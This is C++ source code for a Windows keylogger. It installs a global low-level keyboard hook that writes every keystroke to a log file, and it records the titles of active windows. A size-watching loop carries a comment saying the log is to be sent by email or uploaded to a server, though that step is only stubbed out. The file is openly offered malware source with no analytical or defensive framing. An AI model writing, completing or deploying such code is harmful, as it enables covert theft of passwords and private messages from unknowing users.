#define _CRT_SECURE_NO_WARNINGS
#define MAX_FILE_SIZE 20000
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;

FILE* f;
HHOOK hKeyboardHook;
static int keysPressed = 0;

DWORD WINAPI Keylogger(LPVOID lpParm) {
    HINSTANCE hins;
    hins = GetModuleHandle(NULL);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keystroke
	char* workFullPath;
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
		workFullPath = getlogfilepath(getlogfilename());
		if (workFullPath) {
			f = fopen(workFullPath, "a+");
		}
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		wchar_t lpszKeyName[1024] = { 0 };
		lpszKeyName[0] = '[';

		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
		int key = hooked_key.vkCode;
		lpszKeyName[i] = ']';
		if (key >= 'A' && key <= 'Z') {
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				key += 0x20;
			if (f != NULL)
				fprintf(f, "%c", key);
		}
		else {
			if (f != NULL)
				fprintf(f, "%s", ConvertWCtoC(lpszKeyName));
		}
		if ((keysPressed % 20) == 0) {
			fprintf(f, "\n");
		}
		keysPressed++;
		fclose(f);
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void wintitle() {		//  logging the currently running windows
    string oldtitle = gettitle();
	logger(string(gettitle()) + "\n");
    while (TRUE) {
        Sleep(100);
        if (gettitle() != oldtitle) {
            logger("\n" + string(gettitle()) + "\n");
        }
        oldtitle = gettitle();
    }
}

void FSD() {		// File size detetor
    while (TRUE) {
        Sleep(1000);
        if (getfilesize() > MAX_FILE_SIZE) {
			/* sends logfile to email
			...
			or upload to server*/
            printf("File size over!\n");
        }
    }
}
